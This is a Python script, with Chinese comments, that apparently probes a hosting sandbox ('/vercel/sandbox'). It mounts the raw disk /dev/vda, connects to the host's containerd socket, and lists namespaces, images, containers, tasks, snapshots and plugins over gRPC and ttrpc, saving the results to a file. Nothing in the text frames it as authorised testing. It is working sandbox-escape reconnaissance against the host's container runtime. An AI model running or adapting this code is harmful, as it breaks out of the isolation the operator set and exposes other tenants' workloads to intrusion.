# -*- coding: utf-8 -*-
"""vda29_ctrd_h2: curl --http2-prior-knowledge 探测 containerd.sock 标准服务
P1: 标准 containerd 服务枚举 (Version/Namespaces/Images/Containers/Tasks/Content/Snapshots)
P2: 结果解析 - 镜像/容器/任务列表
输出落盘 + 哨兵 V29P_DONE"""
import os, time, socket, ctypes, re, struct, subprocess

OUT = '/vercel/sandbox/v29p.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def curl_h2(sockpath, path, body, ctype='application/grpc', t=6):
    try:
        tmp = '/tmp/curl_req_%d.bin' % os.getpid()
        open(tmp, 'wb').write(body)
        cmd = ['curl', '-sS', '--max-time', str(t), '--http2-prior-knowledge',
               '--unix-socket', sockpath, '-X', 'POST',
               '-H', 'Content-Type: %s' % ctype,
               '-H', 'TE: trailers',
               '--data-binary', '@%s' % tmp,
               'http://unix%s' % path]
        r = subprocess.run(cmd, capture_output=True, timeout=t + 3)
        out = r.stdout
        err = r.stderr.decode('utf-8', errors='replace')[:200]
        return 'rc=%d' % r.returncode, out, err
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, b'', ''


def grpc_env(payload=b''):
    return b'\x00' + struct.pack('>I', len(payload)) + payload


def pstr(field_no, s):
    b = s.encode()
    tag = (field_no << 3) | 2
    out = bytearray()
    while tag > 127:
        out.append((tag & 127) | 128)
        tag >>= 7
    out.append(tag)
    l = len(b)
    while l > 127:
        out.append((l & 127) | 128)
        l >>= 7
    out.append(l)
    return bytes(out) + b


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount ret=%d' % ret)

    csp = '/mnt/vdax/run/containerd/containerd.sock'

    # P1: 标准 containerd 服务枚举
    log('=== P1 containerd h2 services ===')
    probes = [
        ('Version/Version', '/containerd.services.version.v1.Version/Version'),
        ('Namespaces/List', '/containerd.services.namespaces.v1.Namespaces/List'),
        ('Images/List', '/containerd.services.images.v1.Images/List'),
        ('Containers/List', '/containerd.services.containers.v1.Containers/List'),
        ('Tasks/List', '/containerd.services.tasks.v1.Tasks/List'),
        ('Content/List', '/containerd.services.content.v1.Content/List'),
        ('Snapshots/List', '/containerd.services.snapshots.v1.Snapshots/List'),
        ('Leases/List', '/containerd.services.leases.v1.Leases/List'),
        ('Introspection/Plugins', '/containerd.services.introspection.v1.Introspection/Plugins'),
        ('Health/Check', '/grpc.health.v1.Health/Check'),
    ]
    results = {}
    for tag, path in probes:
        rc, out, err = curl_h2(csp, path, grpc_env(b''), t=5)
        # 解析 grpc 响应: 5字节帧头 + protobuf
        disp = ''
        if out:
            disp = out[:600].decode('utf-8', errors='replace')
            # 提取 grpc-status trailer
            m = re.search(rb'grpc-status:\s*(\d+)', out)
            if m:
                disp += ' | status=%s' % m.group(1).decode()
            mm = re.search(rb'grpc-message:\s*([^\r\n]+)', out)
            if mm:
                disp += ' msg=%s' % mm.group(1).decode(errors='replace')
        log('%-22s -> %s | %s | %s' % (tag, rc, disp[:350], err))
        results[tag] = out
        time.sleep(0.2)

    # P2: 解析关键响应
    log('=== P2 parse ===')
    # Images/List 响应解析: ListImagesResponse { repeated Image images = 1; }
    # Image { string name = 1; ... }
    for tag, path in [('Images/List', '/containerd.services.images.v1.Images/List'),
                      ('Containers/List', '/containerd.services.containers.v1.Containers/List'),
                      ('Tasks/List', '/containerd.services.tasks.v1.Tasks/List')]:
        rc, out, err = curl_h2(csp, path, grpc_env(b''), t=5)
        if not out:
            log('%s -> rc=%s no data %s' % (tag, rc, err))
            continue
        # 去帧头: 第一个 gRPC 帧 = 5字节头 + payload
        if len(out) > 5:
            payload = out[5:]
            # 尝试提取字符串 (protobuf 里的 name 字段)
            strs = re.findall(rb'[\x20-\x7e]{6,}', payload)
            log('%s strings: %s' % (tag, [s.decode(errors='replace') for s in strs[:30]]))
        time.sleep(0.2)

    # P2b: 探测 TTRPC (containerd 的 ttrpc 协议不走 h2)
    log('=== P2b ttrpc check ===')
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect(csp)
        # ttrpc 请求帧: version(1) type(1) flags(1) stream(4) len(4) [padding]
        # 发一个 ping: type=2 (PING)
        req = bytes([0x01, 0x02, 0x00]) + struct.pack('<I', 1) + struct.pack('<I', 0)
        s.sendall(req)
        resp = s.recv(512)
        log('ttrpc ping -> %s' % resp.hex()[:200])
        s.close()
    except Exception as e:
        log('ttrpc ERR %s' % type(e).__name__)

    log('V29P_DONE')
    f.close()


if __name__ == '__main__':
    main()
